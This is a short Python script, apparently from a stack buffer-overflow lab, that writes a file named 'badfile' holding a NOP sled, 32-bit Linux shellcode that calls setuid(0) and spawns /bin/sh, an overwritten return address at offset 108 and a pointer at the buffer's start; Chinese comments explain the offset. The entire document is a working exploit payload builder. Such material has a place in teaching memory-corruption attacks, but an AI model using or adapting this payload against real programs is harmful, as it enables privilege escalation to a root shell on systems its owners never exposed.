#!/usr/bin/python3
import sys

shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80".encode(
    'latin-1')
# 参数
arraySize = 112
ret = 0x804b00c
vt = 0x804b018
retStart = 108  # 先计算ebp与buffer之间的距离,然后+4
# 初始化数组,用NOP填充
content = bytearray([0x90 for i in range(arraySize)])
retEnd = retStart + 4
start = arraySize - len(shellcode)-4
content[retStart:retEnd] = ret.to_bytes(4, byteorder='little')
content[0:4] = vt.to_bytes(4, byteorder='little')
content[start:] = shellcode
file = open("badfile", "wb")
file.write(content)
file.close
